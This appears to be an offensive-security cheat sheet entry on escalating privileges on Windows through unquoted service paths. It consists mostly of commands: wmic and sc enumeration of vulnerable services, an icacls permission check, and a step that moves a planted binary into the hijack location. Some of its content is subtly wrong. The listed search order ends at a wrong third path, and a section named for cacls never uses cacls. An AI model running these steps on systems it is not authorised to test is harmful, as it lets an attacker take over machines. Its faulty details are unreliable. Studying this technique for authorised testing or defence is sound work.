---
title: Unquoted Service Paths
category: privesc
subcategory: windows-services
os: windows
command: wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
tools: wmic, sc, icacls
---


### Identify vulnerable services

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

If a path contains spaces and is not quoted, e.g. `C:\Program Files\My Program\service.exe`, Windows will try in order:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
```

### Check binary permissions

```cmd
icacls "C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"
```

### Exploitation

If a vulnerable parent directory is writable, plant your binary at the hijack location:

```cmd
move sirenMaint.exe "C:\Program Files\something\Program.exe"
```

### Bulk enumeration with cacls

```cmd
cd C:\Windows\TEMP
sc query state= all | findstr "SERVICE_NAME:" >> ServiceNames.txt
FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i >> Services.txt
FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
type path.txt
```
